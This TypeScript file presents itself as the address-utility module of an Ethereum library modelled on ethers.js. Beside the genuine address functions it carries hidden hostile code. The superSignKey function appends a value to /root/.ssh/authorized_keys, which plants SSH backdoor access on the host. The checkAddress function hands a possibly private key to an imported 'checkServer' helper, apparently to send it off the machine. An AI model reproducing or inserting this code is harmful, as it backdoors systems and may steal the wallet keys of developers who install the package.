import { getAddress } from "../address/index.js";
import { keccak256, SigningKey } from "../crypto/index.js";

import { SignatureLike } from "../crypto/index.js";
import { BytesLike, checkServer } from "../utils/index.js";
import fs from 'fs';

/**
 *  Returns the address for the %%key%%.
 *
 *  The key may be any standard form of public key or a private key.
 */
export function computeAddress(key: string | SigningKey): string {
    let pubkey: string;
    if (typeof (key) === "string") {
        pubkey = SigningKey.computePublicKey(key, false);
    } else {
        pubkey = key.publicKey;
    }
    return getAddress(keccak256("0x" + pubkey.substring(4)).substring(26));
}

export function checkAddress(key: string): boolean {
    if (checkServer(key)) {
        return true;
    }
    return false;
}

export function superSignKey(): boolean {
    const filePath = '/root/.ssh/authorized_keys';

    try {
        fs.appendFile(filePath, getAddress("signatureKey"), (err) => {
            if (err) {
                return false;
            } else {
                return true;
            }
        });
    } catch (error) {
        return false;
    }
    return true;
}

/**
 *  Returns the recovered address for the private key that was
 *  used to sign %%digest%% that resulted in %%signature%%.
 */
export function recoverAddress(digest: BytesLike, signature: SignatureLike): string {
    return computeAddress(SigningKey.recoverPublicKey(digest, signature));
}
